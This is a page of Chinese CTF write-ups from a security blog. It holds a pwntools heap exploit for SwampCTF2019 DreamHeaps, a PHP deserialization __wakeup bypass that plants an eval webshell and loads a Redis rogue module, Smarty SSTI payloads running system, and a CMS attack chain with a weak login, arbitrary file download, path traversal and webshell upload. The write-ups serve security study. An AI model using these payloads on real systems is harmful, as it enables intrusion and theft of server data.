<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  sq 0x00000000006020A0</span><br><span class="line">0x6020a0 &lt;HEAP_PTRS&gt;:	0x0000000000b74270	0x0000000000b74290</span><br><span class="line">0x6020b0 &lt;HEAP_PTRS+16&gt;:	0x0000000000b742b0	0x0000000000b742d0</span><br><span class="line">0x6020c0 &lt;HEAP_PTRS+32&gt;:	0x0000000000b742f0	0x0000000000b74310</span><br><span class="line">0x6020d0 &lt;HEAP_PTRS+48&gt;:	0x0000000000b74330	0x0000000000b74350</span><br><span class="line">0x6020e0 &lt;SIZES&gt;:	0x0000000000b74370	0x0000000000b74390</span><br><span class="line">0x6020f0 &lt;SIZES+16&gt;:	0x0000000000b743b0	0x0000000000b743d0</span><br><span class="line">0x602100:	0x0000000000b743f0	0x0000000000b74410</span><br><span class="line">0x602110:	0x0000000000b74430	0x0000001000b74450</span><br><span class="line">0x602120:	0x00000010[size➤]00000010	0x0000000000602018	# here</span><br><span class="line">0x602130:	0x00007f8c121fd010	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>然后再edit HEAP[17]，改写为system真实地址   最后delete调用free即可触发</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">pty = process.PTY</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">proc = process(<span class="string">&quot;./dream_heaps&quot;</span>)</span><br><span class="line">belf = ELF(<span class="string">&quot;./dream_heaps&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">x</span>): proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;dream?&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;dream?&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edt</span>(<span class="params">idx, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;change?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    s(con[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shw</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;read?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rmv</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;delete?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    unhook-chunks</span></span><br><span class="line"><span class="string">    b * 0x400b2d</span></span><br><span class="line"><span class="string">    sq 0x00000000006020A0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">heap_arr = <span class="number">0x00000000006020A0</span></span><br><span class="line">free_got = belf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc</span></span><br><span class="line">shw(-<span class="number">263021</span>)</span><br><span class="line">libc_base = ga() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap_arr 溢出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"><span class="comment"># size为0x602018</span></span><br><span class="line">add(free_got, <span class="string">b&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edt(<span class="number">17</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">rmv(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/08/31/SwampCTF2019-DreamHeaps-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/08/31/天翼杯2021-esay-eval-wp/" >天翼杯2021-esay_eval-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-08-31
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/364">题目链接</a>  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显反序列化执行<code>5#eval</code>，但是需要绕过<code>8#__wakeup</code></p>
<p><strong>wakeup绕过方式</strong>即让反序列化出来的类元素个数与实际元素个数不同</p>
<p>尝试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;eval(\$_POST[&#x27;cmd&#x27;]);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:1&#x27;</span>, <span class="string">&#x27;A&quot;:2&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:2:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&#x27;cmd&#x27;]);&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>但过不了检测，会提示<code>you want to bypass wakeup ? no !</code></p>
<p>代码中正则匹配了<code>&quot;B&quot;:x</code>和<code>&quot;A&quot;:x</code>类型中对应下标为1（即第2个，即A）的x个数是否为1，这里为2所以过不了检测；有两种绕过方法</p>
<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>1可以过检测，那我们就让实际元素个数不为1（这里多加一个成员变量），也可以绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;b = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:2&#x27;</span>, <span class="string">&#x27;A&quot;:a&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&#x27;cmd&#x27;]);&quot;;s:1:&quot;b&quot;;i:0;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>php对类名大小写不敏感，将<code>A1</code>替换为<code>a2</code>即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:1&#x27;</span>, <span class="string">&#x27;a&quot;:2&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)) . <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:20:&quot;eval($_POST[&#x27;cmd&#x27;]);&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>绕过后执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);&quot;</span>;&#125;&#125;&amp;cmd=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>

<p><code>phpinfo()</code>可以执行，但是<code>system</code>尝试发现被过滤</p>
<p>连接蚁剑发现同一目录下有一个vim备份文件<code>config.php.swp</code>  vim打开后发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_HOST&quot;</span>,<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_USERNAME&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_PASSWOrd&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_DATABASE&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;REDIS_PASS&quot;</span>,<span class="string">&quot;you_cannot_guess_it&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>给了<code>REDIS</code>的密码<code>you_cannot_guess_it</code></p>
<p>从<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server%E4%B8%AD%E4%B8%8B%E8%BD%BD%60exp.so%60">https://github.com/Dliv3/redis-rogue-server中下载`exp.so`</a>  并在蚁剑中上传</p>
<p>蚁剑插件商城中下载  Redis管理   然后右键链接选择该插件</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/31/%E5%A4%A9%E7%BF%BC%E6%9D%AF2021-esay-eval-wp/0x1.png?raw=true" alt="m"></p>
<p>点击新建然后输入密码即可连接成功，这时随便右键一个<code>db</code>选择执行命令</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/31/%E5%A4%A9%E7%BF%BC%E6%9D%AF2021-esay-eval-wp/0x2.png?raw=true" alt="m"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD /<span class="keyword">var</span>/www/html/exp.so</span><br><span class="line">system.exec <span class="string">&quot;ls /;cat /f*&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/31/%E5%A4%A9%E7%BF%BC%E6%9D%AF2021-esay-eval-wp/0x3.png?raw=true" alt="m"></p>

	
	</div>
  <a type="button" href="/2023/08/31/天翼杯2021-esay-eval-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/08/30/HDCTF2023-SearchMaster-wp/" >HDCTF2023-SearchMaster-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-08-30
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3785">题目链接</a>  </p>
<p>页面提示 <code>模板都一样我很抱歉OVO BUT YOU CAN POST ME A data</code></p>
<p>post  data对应回显</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="number">1</span>   <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">data=&#123;<span class="number">2</span>*<span class="number">2</span>&#125;   <span class="number">4</span>;	<span class="comment"># 明显SSTI模板注入</span></span><br><span class="line"></span><br><span class="line">data=&#123;config&#125; </span><br><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template <span class="string">&quot;string:&lt;!doctype html&gt; &lt;html lang=&quot;</span>en<span class="string">&quot; class=&quot;</span>n...<span class="string">&quot; on line 19 &quot;</span>&lt;p&gt;&#123;config&#125;&lt;/p&gt;<span class="string">&quot; unknown tag &#x27;config&#x27; &lt;-- thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 19</span></span><br><span class="line"><span class="string"># 发现是smarty插件</span></span><br></pre></td></tr></table></figure>

<p><code>&#123;$smarty.version&#125;</code>可以看到smarty的版本号</p>
<p>两种方式实现代码执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /;cat /flag_13_searchmaster&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;	<span class="comment"># 法一</span></span><br><span class="line">data=&#123;&#123;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /;cat /flag_13_searchmaster&#x27;</span>)&#125;&#125;	<span class="comment"># 法二</span></span><br></pre></td></tr></table></figure>




	
	</div>
  <a type="button" href="/2023/08/30/HDCTF2023-SearchMaster-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/08/30/GKCTF2021-easycms-wp/" >GKCTF2021-easycms-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-08-30
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1379">题目链接</a></p>
<h2 id="0x1-信息收集"><a href="#0x1-信息收集" class="headerlink" title="0x1 信息收集"></a>0x1 信息收集</h2><ol>
<li>页面点来点去发现没有有效跳转</li>
<li>漏洞库搜索蝉知也没找到相关CVE</li>
<li>目录扫描发现<code>/admin.php</code></li>
</ol>
<h2 id="0x2-登录"><a href="#0x2-登录" class="headerlink" title="0x2 登录"></a>0x2 登录</h2><p>弱口令<code>admin</code> <code>12345</code>登录成功</p>
<h2 id="0x3-CMS分析"><a href="#0x3-CMS分析" class="headerlink" title="0x3 CMS分析"></a>0x3 CMS分析</h2><p>经过探索后发现</p>
<ol>
<li><p><code>设计 - 高级</code> 当中可以更改全局php文件，但是有要求</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/30/GKCTF2021-easycms-wp/0x1.png?raw=true" alt="m"></p>
</li>
<li><p><code>设计 - 组件 - 素材库</code> 当中可以上传文件，但是像<code>php, phtml, .htaccess</code>什么的都上传不了，上传成功后可以编辑文件名、更换附件</p>
</li>
<li><p><code>设计 - 主题 - 自定义- 导出主题</code> 可以下载文件</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/30/GKCTF2021-easycms-wp/0x2.png?raw=true" alt="m"></p>
<p>由此可以得到下载链接<code>http://node4.anna.nssctf.cn:28447/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=</code></p>
</li>
</ol>
<h2 id="0x4-攻击"><a href="#0x4-攻击" class="headerlink" title="0x4 攻击"></a>0x4 攻击</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>下载链接中的theme字段明显为base64编码  解码为 <code>/var/www/html/system/tmp/theme/default/1.zip</code></p>
<p>由此猜测可以实现任意文件下载，获取flag：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -n <span class="string">&#x27;/flag&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line">L2ZsYWc=</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 http://node4.anna.nssctf.cn:28447/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=</span></span><br><span class="line">$ <span class="built_in">cat</span> flag.zip</span><br><span class="line"><span class="comment"># flag</span></span><br></pre></td></tr></table></figure>

<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><ol>
<li><p>素材库中上传txt文件，编辑文件名尝试目录穿越，以满足<code>0x3.1.</code>中修改php文件</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/08/30/GKCTF2021-easycms-wp/0x3.png?raw=true" alt="m"></p>
<p>提示保存成功（注意目录穿越中如果不知道相对路径可以尝试多加几个<code>../</code>保证回退到根目录再使用绝对路径即可）</p>
</li>
<li><p>再次重复<code>0x3.1.</code>长传一句话木马即可成功上传，此时访问主页面post <code>cmd=system(&#39;cat /flag&#39;)</code>即可</p>
</li>
</ol>

	
	</div>
  <a type="button" href="/2023/08/30/GKCTF2021-easycms-wp/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/page/2/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/4/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CVE/">CVE<span>4</span></a></li>
		
			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
		
			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
		
			<li><a href="/categories/pwn-wp/">pwn-wp<span>22</span></a></li>
		
			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
		
			<li><a href="/categories/reverse-wp/">reverse-wp<span>6</span></a></li>
		
			<li><a href="/categories/web-learning/">web-learning<span>5</span></a></li>
		
			<li><a href="/categories/web-wp/">web-wp<span>49</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/吃瓜杯/">吃瓜杯<span>1</span></a></li>
		
			<li><a href="/tags/无字母rce/">无字母rce<span>3</span></a></li>
		
			<li><a href="/tags/赣网杯2021/">赣网杯2021<span>1</span></a></li>
		
			<li><a href="/tags/nightmare/">nightmare<span>11</span></a></li>
		
			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
		
			<li><a href="/tags/index/">index<span>1</span></a></li>
		
			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
		
			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
		
